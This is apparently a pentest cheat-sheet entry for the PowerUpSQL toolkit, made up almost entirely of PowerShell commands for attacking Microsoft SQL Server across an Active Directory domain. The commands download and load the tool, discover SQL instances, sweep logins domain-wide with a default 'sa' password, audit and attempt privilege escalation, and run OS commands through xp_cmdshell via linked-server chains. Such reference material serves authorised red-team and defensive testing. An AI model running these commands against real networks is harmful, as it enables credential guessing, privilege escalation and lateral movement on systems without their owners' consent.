# 03.26 PowerUpSQL

> PowerShell MSSQL pentest toolkit — discovery, auth attacks, privilege escalation, lateral via linked servers.

## Overview

PowerUpSQL is the swiss army knife for MSSQL attack workflows from PowerShell. Discovers MSSQL instances via SPN queries, broadcast, and UDP probes; tests login (anonymous, SQL auth, Windows auth); enumerates databases, logins, server links; attempts privesc via xp_cmdshell/impersonation/CLR assemblies/agent jobs; pivots cross-trust through linked servers. Heavy coverage of MSSQL attack surface — critical for any AD environment with SQL Server.

## Steps

- **Step 1** - Get module.
- **Step 2** - Discover MSSQL instances domain-wide.
- **Step 3** - Test auth, enumerate, escalate, pivot.

## Commands

### Install + import

```powershell
iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1' -OutFile PowerUpSQL.ps1
. .\PowerUpSQL.ps1
```

### Domain-wide MSSQL discovery

```powershell
Get-SQLInstanceDomain                              # query AD for SPNs
Get-SQLInstanceBroadcast                           # UDP 1434 broadcast
Get-SQLInstanceFile -FilePath sql_servers.txt      # from list
```

### Test logins (auth sweep)

```powershell
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose -Threads 10
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Username sa -Password Password1!
```

### Per-instance info

```powershell
Get-SQLServerInfo -Instance <INSTANCE>
Get-SQLDatabase -Instance <INSTANCE>
Get-SQLServerLogin -Instance <INSTANCE>
Get-SQLServerLinkCrawl -Instance <INSTANCE>      # follow linked-server chain
```

### Privilege escalation checks

```powershell
Invoke-SQLAuditPrivXpDirtree -Instance <INSTANCE>
Invoke-SQLAuditPrivXpCmdshell -Instance <INSTANCE>
Invoke-SQLAuditPrivImpersonateLogin -Instance <INSTANCE>
Invoke-SQLAuditPrivServerLink -Instance <INSTANCE>
```

### Linked server pivot to OS exec

```powershell
Get-SQLServerLinkCrawl -Instance <INSTANCE> -Query 'EXEC master..xp_cmdshell ''whoami'''
```

### Audit + escalate in one shot

```powershell
Invoke-SQLEscalatePriv -Instance <INSTANCE>
# Or audit all known privesc on all reachable instances:
Get-SQLInstanceDomain | Invoke-SQLAudit
```
